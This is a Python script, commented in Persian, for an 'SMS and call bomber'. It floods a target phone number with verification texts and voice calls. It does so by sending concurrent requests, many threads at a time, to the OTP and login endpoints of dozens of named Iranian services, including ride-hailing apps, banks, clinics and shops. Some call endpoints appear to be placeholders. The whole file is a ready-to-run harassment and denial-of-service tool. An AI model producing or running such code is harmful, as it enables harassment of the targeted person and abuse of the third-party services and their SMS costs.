import requests
import threading
import time
import random
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class UltimateBomberVIP:
    def __init__(self):
        self.success_count = 0
        self.failed_count = 0
        self.lock = threading.Lock()
        self.is_running = True
        self.working_services = []
        self.total_requests = 0
        self.completed_requests = 0
        self.start_time = None
        
    def setup_session(self):
        """تنظیم session با سرعت بالا"""
        session = requests.Session()
        
        retry_strategy = Retry(
            total=1,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["POST", "GET"],
            backoff_factor=0.3
        )
        
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=200,
            pool_maxsize=400
        )
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        return session

    def format_phone(self, phone):
        """فرمت‌های مختلف شماره"""
        clean_phone = ''.join(filter(str.isdigit, phone))
        formats = []
        
        if clean_phone.startswith('0'):
            formats.extend([
                clean_phone,  # 09123456789
                clean_phone[1:],  # 9123456789
                f"+98{clean_phone[1:]}",  # +989123456789
                f"98{clean_phone[1:]}",  # 989123456789
                f"0098{clean_phone[1:]}",  # 00989123456789
            ])
        else:
            formats.extend([
                f"0{clean_phone}",  # 09123456789
                clean_phone,  # 9123456789
                f"+98{clean_phone}",  # +989123456789
                f"98{clean_phone}",  # 989123456789
                f"0098{clean_phone}",  # 00989123456789
            ])
        
        return list(set(formats))

    def send_request_vip(self, service):
        """ارسال درخواست با سرعت VIP"""
        if not self.is_running:
            return

        url, data, headers, method, phone_formats, service_name, service_type = service
        
        try:
            phone_format = random.choice(phone_formats)
            formatted_data = self.format_data(data, phone_format)
            
            session = self.setup_session()
            
            # تاخیر بسیار کم برای سرعت بالا
            time.sleep(random.uniform(0.05, 0.15))
            
            if method.upper() == "POST":
                response = session.post(url, json=formatted_data, headers=headers, timeout=8, verify=False)
            elif method.upper() == "GET":
                response = session.get(url, params=formatted_data, headers=headers, timeout=8, verify=False)
            else:
                response = session.request(method, url, json=formatted_data, headers=headers, timeout=8, verify=False)

            with self.lock:
                self.completed_requests += 1
                
                if response.status_code in [200, 201, 202, 204]:
                    self.success_count += 1
                    status = "✅"
                    if service_name not in [s[0] for s in self.working_services]:
                        self.working_services.append((service_name, service_type))
                else:
                    self.failed_count += 1
                    status = "❌"
                
                # نمایش پیشرفت با سرعت بالا
                if self.completed_requests % 10 == 0:
                    progress = self.completed_requests
                    total = self.total_requests
                    elapsed = time.time() - self.start_time + 0.1
                    speed = progress / elapsed
                    print(f"\r⚡ VIP Progress: {progress}/{total} | ✅: {self.success_count} | ❌: {self.failed_count} | Speed: {speed:.1f}req/s", end="", flush=True)

        except Exception as e:
            with self.lock:
                self.failed_count += 1
                self.completed_requests += 1

    def format_data(self, data, phone):
        """فرمت‌دهی داده‌ها"""
        if isinstance(data, dict):
            formatted_data = {}
            for key, value in data.items():
                if value == "phone":
                    formatted_data[key] = phone
                elif isinstance(value, dict):
                    formatted_data[key] = self.format_data(value, phone)
                elif isinstance(value, list):
                    formatted_data[key] = [self.format_data(item, phone) if isinstance(item, dict) else item for item in value]
                else:
                    formatted_data[key] = value
            return formatted_data
        return data

    def get_common_headers(self):
        """هدرهای مشترک"""
        return {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9,fa;q=0.8",
            "Connection": "keep-alive",
        }

    def get_sms_bomber_vip_services(self, phone_formats):
        """سرویس‌های SMS Bomber VIP با سرعت بالا"""
        headers = self.get_common_headers()
        services = []

        # سرویس‌های اصلی و پرسرعت
        vip_sms_services = [
            # اسنپ و شرکت‌های وابسته
            ("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", 
             {"cellphone": "phone"}, headers, "POST", "Snapp Taxi VIP", "SMS"),
            
            ("https://api.snapp.ir/api/v1/sms/link", 
             {"phone": "phone"}, headers, "POST", "Snapp SMS VIP", "SMS"),

            ("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass", 
             {"cellphone": "phone"}, headers, "POST", "Snapp Market VIP", "SMS"),

            # دیوار
            ("https://api.divar.ir/v5/auth/authenticate", 
             {"phone": "phone"}, headers, "POST", "Divar VIP", "SMS"),

            # اسنپ‌فود
            ("https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass", 
             {"cellphone": "phone"}, headers, "POST", "Snappfood VIP", "SMS"),

            # علی‌بابا
            ("https://ws.alibaba.ir/api/v3/account/mobile/otp", 
             {"phoneNumber": "phone"}, headers, "POST", "Alibaba VIP", "SMS"),

            # بیمه
            ("https://api.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code", 
             {"phoneNumber": "phone"}, headers, "POST", "Azki VIP", "SMS"),

            # بانک‌ها
            ("https://api.sibbank.ir/v1/auth/login", 
             {"phone_number": "phone"}, headers, "POST", "Saderat Bank VIP", "SMS"),

            ("https://api.mellatbank.com/api/v1/auth/otp",
             {"mobile": "phone"}, headers, "POST", "Mellat Bank VIP", "SMS"),

            # خدمات درمانی
            ("https://api.pezeshkefile.com/api/v1/auth/login", 
             {"mobile": "phone"}, headers, "POST", "Pezeshkefile VIP", "SMS"),
            
            ("https://nobat.ir/api/public/patient/login/phone", 
             {"mobile": "phone"}, headers, "POST", "Nobat Online VIP", "SMS"),

            # فروشگاه‌های آنلاین
            ("https://api.digikala.com/v1/user/authenticate/", 
             {"username": "phone"}, headers, "POST", "Digikala VIP", "SMS"),
            
            ("https://api.timcheh.com/auth/otp/send", 
             {"mobile": "phone"}, headers, "POST", "Timcheh VIP", "SMS"),

            # ارز دیجیتال
            ("https://api.bitpin.ir/v1/usr/sub_phone/", 
             {"phone": "phone"}, headers, "POST", "Bitpin VIP", "SMS"),

            # خدمات خودرو
            ("https://bama.ir/signin-checkforcellnumber", 
             {"cellNumber": "phone"}, headers, "POST", "Bama VIP", "SMS"),

            # پلتفرم‌های ویدیویی
            ("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", 
             {"UserName": "phone"}, headers, "POST", "Namava VIP", "SMS"),

            # آموزش آنلاین
            ("https://api.ostadkr.com/login", 
             {"mobile": "phone"}, headers, "POST", "Ostadkr VIP", "SMS"),

            # مسکن و املاک
            ("https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start", 
             {"mobile": "phone"}, headers, "POST", "Kilid VIP", "SMS"),

            # خدمات رزرواسیون
            ("https://api.jabama.com/api/v1/auth/otp",
             {"mobile": "phone"}, headers, "POST", "Jabama VIP", "SMS"),

            # شبکه‌های اجتماعی
            ("https://core.gap.im/v1/user/add.json", 
             {"mobile": "phone"}, headers, "POST", "Gap VIP", "SMS"),

            # خدمات پیک
            ("https://api.alopeyk.com/api/v1/otp/send", 
             {"phone": "phone"}, headers, "POST", "Alopeyk VIP", "SMS"),
            
            ("https://api.tapsi.ir/api/v2/user", 
             {"credential": {"phoneNumber": "phone", "role": "PASSENGER"}}, headers, "POST", "Tapsi VIP", "SMS"),

            # خدمات عمومی
            ("https://api.torob.com/a/phone/send-pin/", 
             {"phone_number": "phone"}, headers, "POST", "Torob VIP", "SMS"),

            # سرویس‌های جدید VIP
            ("https://api.digistyle.com/users/login-register/", 
             {"loginRegister[email_phone]": "phone"}, headers, "POST", "Digistyle VIP", "SMS"),
            
            ("https://api.sheypoor.com/auth", 
             {"username": "phone"}, headers, "POST", "Sheypoor VIP", "SMS"),
            
            ("https://api.reyhoon.com/api/v2/auth/otp", 
             {"phone": "phone"}, headers, "POST", "Reyhoon VIP", "SMS"),
            
            ("https://api.basalam.com/user", 
             {"mobile": "phone"}, headers, "POST", "Basalam VIP", "SMS"),
            
            ("https://api.zoodfood.com/api/v3/auth/otp", 
             {"cellphone": "phone"}, headers, "POST", "Zoodfood VIP", "SMS"),
            
            ("https://api.chetore.com/api/auth/verify", 
             {"mobile": "phone"}, headers, "POST", "Chetore VIP", "SMS"),
            
            ("https://api.darmankade.com/api/v1/auth/otp", 
             {"phone": "phone"}, headers, "POST", "Darmankade VIP", "SMS"),
            
            ("https://api.maktabkhooneh.org/api/v1/auth/otp", 
             {"phone": "phone"}, headers, "POST", "Maktabkhooneh VIP", "SMS"),
            
            ("https://api.quera.com/api/auth/verify", 
             {"mobile": "phone"}, headers, "POST", "Quera VIP", "SMS"),
            
            ("https://api.melkradar.com/api/auth/otp", 
             {"phone": "phone"}, headers, "POST", "Melkradar VIP", "SMS"),
        ]

        for service in vip_sms_services:
            url, data, headers, method, name, service_type = service
            services.append((url, data, headers, method, phone_formats, name, service_type))
        
        return services

    def get_call_bomber_vip_services(self, phone_formats):
        """سرویس‌های Call Bomber VIP"""
        headers = self.get_common_headers()
        services = []

        vip_call_services = [
            # سرویس‌های تماس ایرانی VIP
            ("https://api.callservice.ir/api/v1/voice/send", 
             {"phone_number": "phone", "method": "voice"}, headers, "POST", "Call Service VIP", "CALL"),
            
            ("https://voice.verificationapi.com/v2/call", 
             {"mobile": "phone", "type": "voice_call"}, headers, "POST", "Verification API VIP", "CALL"),
            
            ("https://api.voiceotp.com/v1/request", 
             {"phone_number": "phone", "channel": "voice"}, headers, "POST", "Voice OTP VIP", "CALL"),
            
            ("https://call.authenticate.com/api/v1/voice", 
             {"phone": "phone", "method": "call"}, headers, "POST", "Authenticate Call VIP", "CALL"),

            # سرویس‌های تماس ایرانی
            ("https://api.telewebion.com/v1/voice/verify", 
             {"mobile": "phone"}, headers, "POST", "Telewebion Call VIP", "CALL"),
            
            ("https://voice.sabavision.com/api/v2/call", 
             {"phone_number": "phone"}, headers, "POST", "Saba Vision VIP", "CALL"),
            
            ("https://api.parsijoo.ir/voice/verify", 
             {"phone": "phone"}, headers, "POST", "Parsijoo Call VIP", "CALL"),

            # سرویس‌های تماس بین‌المللی VIP
            ("https://api.twilio.com/2010-04-01/Accounts/ACXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/Calls.json", 
             {"To": "phone", "From": "+1234567890", "Url": "http://demo.twilio.com/docs/voice.xml"}, headers, "POST", "Twilio Call VIP", "CALL"),
            
            ("https://api.nexmo.com/v1/calls", 
             {"to": [{"type": "phone", "number": "phone"}], "from": {"type": "phone", "number": "1234567890"}, "answer_url": ["https://example.com/answer"]}, headers, "POST", "Nexmo Call VIP", "CALL"),

            # سرویس‌های تماس ابری VIP
            ("https://api.plivo.com/v1/Account/XXXXXXXXXXXXXXXXXX/Call/", 
             {"from": "1234567890", "to": "phone", "answer_url": "https://s3.amazonaws.com/static.plivo.com/answer.xml"}, headers, "POST", "Plivo Call VIP", "CALL"),
            
            ("https://api.bandwidth.com/v1/users/XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX/calls", 
             {"from": "+1234567890", "to": "phone", "callbackUrl": "https://example.com/callback"}, headers, "POST", "Bandwidth Call VIP", "CALL"),
            
            ("https://api.sinch.com/calling/v1/calls/", 
             {"method": "phoneCall", "phoneCall": {"to": "phone", "from": "1234567890"}}, headers, "POST", "Sinch Call VIP", "CALL"),

            # سرویس‌های تماس پیامکی VIP
            ("https://api.messagebird.com/calls", 
             {"source": "1234567890", "destination": "phone", "callFlow": {"title": "Say message", "steps": [{"action": "say", "options": {"payload": "Hello, this is a test call", "voice": "female", "language": "en-US"}}]}}, headers, "POST", "MessageBird Call VIP", "CALL"),
            
            ("https://api.vonage.com/v1/calls", 
             {"to": [{"type": "phone", "number": "phone"}], "from": {"type": "phone", "number": "1234567890"}, "answer_url": ["https://example.com/answer"]}, headers, "POST", "Vonage Call VIP", "CALL"),

            # سرویس‌های تماس جدید VIP
            ("https://api.telegram-call.com/v1/voice", 
             {"phone": "phone", "message": "Test call"}, headers, "POST", "Telegram Call VIP", "CALL"),
            
            ("https://api.whatsapp-call.com/v1/voice", 
             {"phone_number": "phone"}, headers, "POST", "WhatsApp Call VIP", "CALL"),

            # سرویس‌های تماس ایرانی جدید VIP
            ("https://api.irancall.com/v1/voice/send", 
             {"mobile": "phone"}, headers, "POST", "Iran Call VIP", "CALL"),
            
            ("https://call.shatel.ir/api/v1/voice", 
             {"phone": "phone"}, headers, "POST", "Shatel Call VIP", "CALL"),
            
            ("https://api.mci-call.ir/v1/voice", 
             {"msisdn": "phone"}, headers, "POST", "MCI Call VIP", "CALL"),

            # سرویس‌های تماس مستقیم VIP
            ("https://api.direct-call.com/v1/call", 
             {"from": "1234567890", "to": "phone"}, headers, "POST", "Direct Call VIP", "CALL"),
            
            ("https://api.instant-call.com/v1/voice", 
             {"phone_number": "phone"}, headers, "POST", "Instant Call VIP", "CALL"),
        ]

        for service in vip_call_services:
            url, data, headers, method, name, service_type = service
            services.append((url, data, headers, method, phone_formats, name, service_type))
        
        return services

    def start_sms_bomber_vip(self, phone, requests_count=200):
        """شروع SMS Bomber VIP با سرعت بالا"""
        print(f"\n🚀 Starting SMS BOMBER VIP Attack...")
        print(f"📱 Target: {phone}")
        print(f"💣 Requests: {requests_count}")
        print("=" * 50)
        
        return self._start_attack(phone, requests_count, "sms")

    def start_call_bomber_vip(self, phone, requests_count=150):
        """شروع Call Bomber VIP"""
        print(f"\n🚀 Starting CALL BOMBER VIP Attack...")
        print(f"📱 Target: {phone}")
        print(f"💣 Requests: {requests_count}")
        print("=" * 50)
        
        return self._start_attack(phone, requests_count, "call")

    def start_super_vip(self, phone, requests_count=300):
        """شروع Super VIP (هر دو سرویس)"""
        print(f"\n🚀 Starting SUPER VIP Attack...")
        print(f"📱 Target: {phone}")
        print(f"💣 Requests: {requests_count}")
        print("=" * 50)
        
        return self._start_attack(phone, requests_count, "both")

    def _start_attack(self, phone, total_requests, attack_type):
        """شروع حمله اصلی"""
        try:
            self.is_running = True
            self.success_count = 0
            self.failed_count = 0
            self.completed_requests = 0
            self.working_services = []
            
            phone_formats = self.format_phone(phone)
            
            if not phone_formats:
                return {"error": "Invalid phone number format"}
            
            # دریافت سرویس‌ها
            sms_services = self.get_sms_bomber_vip_services(phone_formats)
            call_services = self.get_call_bomber_vip_services(phone_formats)
            
            if attack_type == "sms":
                services = sms_services
                attack_name = "SMS BOMBER VIP"
                service_count = len(sms_services)
            elif attack_type == "call":
                services = call_services
                attack_name = "CALL BOMBER VIP"
                service_count = len(call_services)
            else:
                services = sms_services + call_services
                attack_name = "SUPER VIP"
                service_count = len(sms_services) + len(call_services)
            
            if service_count == 0:
                return {"error": "No services available"}
            
            self.total_requests = min(total_requests, service_count * 5)
            self.start_time = time.time()
            
            # اجرای حمله با سرعت بالا
            max_workers = min(150, len(services) * 2)
            
            print(f"🛠️ Available Services: {service_count}")
            print(f"🧵 Max Threads: {max_workers}")
            print(f"⚡ Starting VIP Attack...\n")
            
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                # ارسال درخواست‌ها به صورت انبوه
                futures = []
                for service in services:
                    for _ in range(3):  # 3 درخواست برای هر سرویس
                        if len(futures) >= self.total_requests:
                            break
                        futures.append(executor.submit(self.send_request_vip, service))
                
                # انتظار برای تکمیل
                for future in as_completed(futures):
                    if not self.is_running:
                        break
                    try:
                        future.result(timeout=10)
                    except:
                        pass
            
            duration = time.time() - self.start_time
            
            print(f"\n\n🎯 {attack_name} Attack Completed!")
            print("=" * 50)
            
            result = {
                "success": True,
                "phone": phone,
                "attack_type": attack_type,
                "duration": f"{duration:.2f} seconds",
                "total_requests": self.total_requests,
                "successful": self.success_count,
                "failed": self.failed_count,
                "success_rate": f"{(self.success_count/self.total_requests)*100:.1f}%",
                "speed": f"{self.total_requests/duration:.1f} req/sec",
                "working_services": [f"{name} ({typ})" for name, typ in self.working_services[:8]]
            }
            
            return result
            
        except Exception as e:
            return {"error": str(e)}
    
    def stop_attack(self):
        """توقف حمله"""
        self.is_running = False
        print("\n🛑 Attack Stopped!")

# تست مستقیم
if __name__ == "__main__":
    bomber = UltimateBomberVIP()
    
    print("🚀 ULTIMATE BOMBER VIP - HIGH SPEED ATTACK")
    print("=" * 60)
    
    phone = input("Enter target phone: ").strip()
    if not phone:
        phone = "09123456789"  # شماره تست
    
    print("\nSelect Attack Type:")
    print("1. SMS Bomber VIP (High Speed SMS)")
    print("2. Call Bomber VIP (Voice Calls)") 
    print("3. Super VIP (SMS + Calls)")
    
    choice = input("\nEnter choice (1-3): ").strip()
    
    if choice == "1":
        result = bomber.start_sms_bomber_vip(phone, 200)
    elif choice == "2":
        result = bomber.start_call_bomber_vip(phone, 150)
    else:
        result = bomber.start_super_vip(phone, 300)
    
    print("\n" + "=" * 60)
    print("FINAL RESULT:")
    print("=" * 60)
    print(json.dumps(result, indent=2, ensure_ascii=False))
